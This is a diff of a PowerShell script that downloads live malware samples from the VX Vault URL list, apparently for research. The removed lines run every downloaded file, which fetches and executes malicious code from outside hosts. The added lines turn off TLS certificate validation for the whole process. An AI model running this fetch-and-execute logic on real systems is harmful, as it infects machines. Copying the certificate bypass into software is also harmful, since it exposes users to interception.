@@ -1,67 +1,61 @@
-# Define the URL to fetch the malicious URLs
-$vxvaultURL = "https://vxvault.net/URL_List.php"
-
-# Define the download folder on C:\Temp
-$downloadPath = "C:\VXVaultDownloads"
-
-# Ensure the download folder exists
-if (!(Test-Path -Path $downloadPath)) {
-    New-Item -ItemType Directory -Path $downloadPath | Out-Null
-}
-
-# Download the list of malicious URLs
-try {
-    $response = Invoke-WebRequest -Uri $vxvaultURL -UseBasicParsing
-} catch {
-    Write-Host "Failed to fetch the URL list. Error: $_"
-    exit 1
-}
-
-# Extract URLs from the response
-$matches = $response.Content -split "`n" | Select-String -Pattern "http[s]?://\S+"
-
-if ($matches.Count -eq 0) {
-    Write-Host "No URLs found in the list."
-    exit 1
-}
-
-# Download each file from the list
-$downloadedFiles = @()
-
-foreach ($match in $matches) {
-    $fileUrl = $match -replace "<.*?>", "" # Remove any HTML tags
-    $fileName = [System.IO.Path]::GetFileName($fileUrl)
-    
-    if ($fileName -match "^\w+\.\w+$") {
-        $outputFile = Join-Path -Path $downloadPath -ChildPath $fileName
-    } else {
-        $outputFile = Join-Path -Path $downloadPath -ChildPath (New-Guid).ToString() + ".bin"
-    }
-
-    try {
-        Write-Host "Downloading: $fileUrl"
-        Invoke-WebRequest -Uri $fileUrl -OutFile $outputFile -UseBasicParsing
-        Write-Host "Saved to: $outputFile"
-        $downloadedFiles += $outputFile
-    } catch {
-        Write-Host "Failed to download $fileUrl. Error: $_"
-    }
-}
-
-Write-Host "Download process completed. Files saved to $downloadPath"
-
-# Function to execute all downloaded files
-function Execute-DownloadedFiles {
-    Write-Host "WARNING: EXECUTING MALICIOUS FILES!"
-    foreach ($file in $downloadedFiles) {
-        try {
-            Write-Host "Executing: $file"
-            Start-Process -FilePath $file -NoNewWindow -Wait
-        } catch {
-            Write-Host "Failed to execute $file. Error: $_"
+# Ignore SSL/TLS Certificate Errors
+add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
         }
     }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+
+# Define the URL of the VX Vault list and the destination directory
+$urlList = "https://vxvault.net/URL_List.php"
+$destinationDir = "C:\MalwareSamples"  # Ensure this directory exists and is secured
+
+# Create the destination directory if it doesn't exist
+if (-not (Test-Path -Path $destinationDir)) {
+    New-Item -Path $destinationDir -ItemType Directory | Out-Null
 }
 
-# Call the function to execute the files
-Execute-DownloadedFiles
+# Download the URL list
+try {
+    $urlContent = Invoke-WebRequest -Uri $urlList -UseBasicParsing
+    $urls = $urlContent.Content -split "`n" | Select-String -Pattern "^http" | ForEach-Object { $_.ToString().Trim() }
+} catch {
+    Write-Error "Failed to retrieve the URL list: $_"
+    exit 1
+}
+
+# Download each file with a 3-second timeout
+foreach ($url in $urls) {
+    try {
+        $fileName = $url.Split("/")[-1]
+        if (-not $fileName) { $fileName = "unknown_file.dat" }  # Handle empty filenames
+        $filePath = Join-Path -Path $destinationDir -ChildPath $fileName
+
+        # Create a web request with a 3-second timeout
+        $request = [System.Net.WebRequest]::Create($url)
+        $request.Timeout = 3000  # 3 seconds timeout
+
+        # Get the response and download the file
+        $response = $request.GetResponse()
+        $stream = $response.GetResponseStream()
+        $fileStream = [System.IO.File]::Create($filePath)
+        $stream.CopyTo($fileStream)
+
+        # Close the streams
+        $fileStream.Close()
+        $stream.Close()
+        $response.Close()
+
+        Write-Host "Successfully downloaded: ${fileName}"
+
+    } catch {
+        Write-Warning "Failed to download ${url}: Skipping..."
+        continue
+    }
+}
